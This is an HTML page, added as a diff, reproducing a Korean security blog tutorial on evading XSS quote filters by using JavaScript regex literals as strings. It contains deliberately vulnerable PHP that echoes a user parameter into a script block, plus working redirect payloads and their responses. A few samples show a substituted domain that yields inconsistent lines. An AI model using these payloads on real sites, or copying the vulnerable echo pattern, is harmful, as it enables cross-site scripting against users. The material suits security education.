@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>정규표현식을 이용한 XSS 우회 기법 | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="정규표현식을 이용한 XSS 우회 기법">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-bypass-xssquotation/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="정규표현식을 이용한 XSS 우회 기법">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-bypass-xssquotation/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"정규표현식을 이용한 XSS 우회 기법","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-bypass-xssquotation/","datePublished":"2017-01-10T00:00:00+00:00","dateModified":"2021-07-10T00:00:00+00:00","image":"https://4.bp.blogspot.com/-thRbSD4Im3o/WHTZERkm4aI/AAAAAAAAB3E/eX8GROCjJ1gtCJvqvalO7iQTkuHyvjbPACLcB/s1600/hahwul.jpg"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/"},{"@type":"ListItem","position":5,"name":"정규표현식을 이용한 XSS 우회 기법"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">정규표현식을 이용한 XSS 우회 기법</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2017-01-10">
+                        JANUARY 10, 2017
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><blockquote>
+<p>⚠️ XSS에 대한 전반적인 내용은 <a href="/cullinan/xss/">Cullinan &gt; XSS</a> 페이지에서 관리하고 있습니다. 해당 페이지에서 최신 데이터가 유지되니 참고 부탁드려요 :D</p>
+</blockquote>
+<p>대부분 Reflected XSS가 발생하는 포인트는 비슷비슷합니다. 사용자 입력값에서부터 출발하기 때문에 입력이 노출되는 구간, 그 중에서
+공격에 쓰이는 특수문자에 대한 필터링이 중요하지요. 대표적으로 <code>&lt;</code> <code>&gt;</code> <code>'</code> <code>&quot;</code> 등이 많이 사용됩니다. 최근에 나름 새로운(?) 케이스를 찾았기 때문에 공유드리는게 좋을 것 같아 글 작성합니다.</p>
+<p>매번 XSS 공격 과정은 필터링과의 싸움입니다. 특히 어떤 특수문자를 검증하는지 어떤 방식으로 처리하는지 보면서 요리조리 피해가는 구문을 만들죠. 오늘 소개해드릴 방법은 더블쿼터 or 싱글쿼터 사용이 불가능할 때 대체하는 방법입니다.</p>
+<p>물론 이거 자체가 참신한 우회 방법은 아니겠지만, 작은 기법하나가 취약하다/취약하지 않다를 나누는 큰 기준이 되기도 합니다.</p>
+<h2 id="regular-expression">Regular Expression</h2>
+<p>우회 기법에 앞서 Regular Expression에 대해 알고가야합니다. IT 하시는 분이라면 다뤄보셨거나 최소 들어보셨을것이고 많은 IT기술에 사용되는 것이 바로 Regular Expression, 정규표현식입니다. Regular Expression은 주로 문자열 사이에서 찾아야할 데이터를 규칙성을 가지고 찾는 방법이며 이쪽업계에서는 백신이나 네트워크 장비단에서 공격 패턴을 찾을 때 많이들 사용하죠.</p>
+<p>사실 오늘 기법이 Regular Expression 자체를 이용하진 않습니다. 다만 Javascript에서 Regular Expression을 처리하는 과정에서 생기는 특이사항을 이용하여 XSS나 다른 취약점 우회에 사용될 수 있습니다.</p>
+<h2 id="regexp-and-string">Regexp and String?!</h2>
+<p>Javascript에서 Regular Expression 은 정규식 그 자체로서 의미가 있지만 재미있는 규칙이 하나 더 있습니다. Regular Expression, 즉 슬래쉬와 슬래쉬 사이의 문자를 별도의 변수가 아닌 String 으로 읽는다는 점입니다.</p>
+<p>이를 이용하면 우리는 문자열을 위해 사용하는 Quotation을 대체할 수 있습니다.</p>
+<p>아래 간단한 코드를 하나보죠.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+  <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>location<span class="hljs-punctuation">.</span>href<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://pixn-analytics-portfolio.forhm0220.chatgpt.site&quot;</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>위 코드는 현재 웹 페이지를 https://pixn-analytics-portfolio.forhm0220.chatgpt.site 으로 이동시키는 코드입니다. 여기서 만약 더블쿼테이션을 사용하지 못한다면 어떨까요?</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+  <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>location<span class="hljs-punctuation">.</span>href<span class="hljs-operator">=</span>https<span class="hljs-operator">:</span><span class="hljs-comment">https://pixn-analytics-portfolio.forhm0220.chatgpt.site;
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<blockquote>
+<p>SyntaxError: missing ; before statement
+<cite>Browser</cite></p>
+</blockquote>
+<p>위와 같이 Syntax 에러가 발생합니다. 왜냐하면 <code>https://pixn-analytics-portfolio.forhm0220.chatgpt.site</code>은 문자열로 인식되지 않기 때문이죠. 조금 더 쉽게 풀어보겠습니다. 아래 두 선언부분의 차이가 보이시나요?</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">var</span> param<span class="hljs-operator">=</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">var</span> param<span class="hljs-operator">=</span>b<span class="hljs-punctuation">;</span>
+</code></pre>
+<p>맨 윗줄은 param이라는 변수에 String &quot;B&quot;를 넣어서 변수를 만들고 두번째 줄은 변수 param에 변수 b의 내용을 집어넣습니다. 약간의 차이로 로직의 흐름이 크게 바뀌기 때문에 싱글쿼터 or 더블쿼터는 굉장히 중요합니다.</p>
+<p>그럼 오늘의 주요 부분인 Regular Expression에 대해 보도록 하겠습니다. 이런 형태의 정규표현식은 주어진 문자열 내 abcd를 찾는 정규표현식입니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-regexp">/abcd/</span>
+</code></pre>
+<p>정규표현식으로 사용되지만 재미있는건, 마치 String과 비슷하게 동작한다는 점이죠.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+  <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>location<span class="hljs-punctuation">.</span>href<span class="hljs-operator">=</span><span class="hljs-regexp">/http:\/\/www.hahwul.com/</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>우리는 정규식(<code>/http:\/\/www.hahwul.com/</code>) 구문을 이용해서 location.href에 값을 넣어줬습니다. 원래는 슬래쉬와 슬래쉬 사이이기 때문에
+정규표현식에서 사용되는 형태이지만, 특별하게 Javascript는 문자열로 처리하여 더블쿼터나 싱글쿼터가 없이도 문자열 삽입이 가능합니다.</p>
+<p>물론 이런 필터링은 상황에 따라서 작년에 작성했던 <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/05/web-hacking-xdexss-dom-base-evasion.html">XDE(XSS DOM-base Evasion)</a>으로도 가능하지만 오늘 소개해드린 방법이 조금 더 유용하지 않을까 싶습니다.</p>
+<h2 id="bypass-xssquotation-filtering-with-regular-expression">Bypass XSS(Quotation filtering) with Regular expression</h2>
+<p>위에서 보여드린 정규표현식의 특징을 이용하여 XSS filtering를 우회해봅시다.</p>
+<p>◇ Weak PHP Code (Reflected XSS , XSS Filtering)</p>
+<pre><code class="language-php hljs"><span class="hljs-operator">&lt;</span><span class="hljs-operator">?</span>php
+  <span class="hljs-variable">$q</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$_GET</span><span class="hljs-punctuation">[</span><span class="hljs-string">&#39;q&#39;</span><span class="hljs-punctuation">];</span>
+  <span class="hljs-variable">$q</span> <span class="hljs-operator">=</span> str_replace<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">\&quot;</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">!!!!!!!</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-variable">$q</span><span class="hljs-punctuation">);</span>
+  <span class="hljs-variable">$q</span> <span class="hljs-operator">=</span> str_replace<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">&#39;</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">!!!!!!!</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-variable">$q</span><span class="hljs-punctuation">);</span>
+  <span class="hljs-variable">$q</span> <span class="hljs-operator">=</span> str_replace<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">(</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">!!!!!!!</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-variable">$q</span><span class="hljs-punctuation">);</span>
+  <span class="hljs-variable">$q</span> <span class="hljs-operator">=</span> str_replace<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">)</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">!!!!!!!</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-variable">$q</span><span class="hljs-punctuation">);</span>
+  <span class="hljs-variable">$q</span> <span class="hljs-operator">=</span> str_replace<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">;</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">!!!!!!!</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-variable">$q</span><span class="hljs-punctuation">);</span>
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<pre><code class="language-php hljs"><span class="hljs-operator">&lt;</span>script<span class="hljs-operator">&gt;</span>
+  <span class="hljs-keyword">var</span> intintint <span class="hljs-operator">=</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">?</span>php <span class="hljs-keyword">echo</span> <span class="hljs-variable">$q</span><span class="hljs-punctuation">;</span> <span class="hljs-meta">?&gt;</span> <span class="hljs-punctuation">;</span>
+<span class="hljs-operator">&lt;/</span>script<span class="hljs-operator">&gt;</span>
+</code></pre>
+<p>아래와 같이 페이지를 Redirectoin 시키는 공격코드를 넣으면..</p>
+<p>◇ Default XSS attack code(Redirection)</p>
+<pre><code>GET /weak.php?q=document.location.href=%22https://pixn-analytics-portfolio.forhm0220.chatgpt.site%22
+</code></pre>
+<p>◇ Default XSS Response</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+  <span class="hljs-keyword">var</span> intintint <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>location<span class="hljs-punctuation">.</span>href<span class="hljs-operator">=</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span>http<span class="hljs-operator">:</span><span class="hljs-comment">https://pixn-analytics-portfolio.forhm0220.chatgpt.site!!!!!!! ;
+</span><span class="hljs-comment"></span><span class="hljs-comment"></span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><code>!!!!!!</code>로 필터링되어 들어가게 됩니다. 괄호 제한으로 함수 사용도 불가능하고 다른곳에서 문자열을 불러오자니 DOM에 있는 데이터가 없습니다. 우리는 아까 배운 Regular Expression을 통해서 XSS Filtering 코드를 우회할 수 있습니다.</p>
+<p>◆ XSS Bypass attack code(Redirection)</p>
+<pre><code>GET /weak.php?q=document.location.href=/\/\/www.hahwul.com/
+</code></pre>
+<p>◆ XSS Bypass Response</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+  <span class="hljs-keyword">var</span> intintint <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>location<span class="hljs-punctuation">.</span>href<span class="hljs-operator">=</span><span class="hljs-regexp">/\/\/www.hahwul.com/</span> <span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>◆ XSS Bypass Web View(실제 웹 페이지)</p>
+<pre><code>GET / HTTP/1.1
+Host: www.hahwul.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/test/weak.php?q=document.location.href=/\/\/www.hahwul.com/
+DNT: 1
+Connection: keep-alive
+</code></pre>
+<p><img loading="lazy" src="https://2.bp.blogspot.com/-8APJ9fDFfDM/WHTX55ZaQtI/AAAAAAAAB20/wgu_TD0OCRwhBnDC_RDr-SAfleQDRkmfgCLcB/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_020.png" alt="" />
+<em>우측 개발자도구를 보면 스크립트로 인해 Redirection 됨을 알 수 있습니다.</em></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
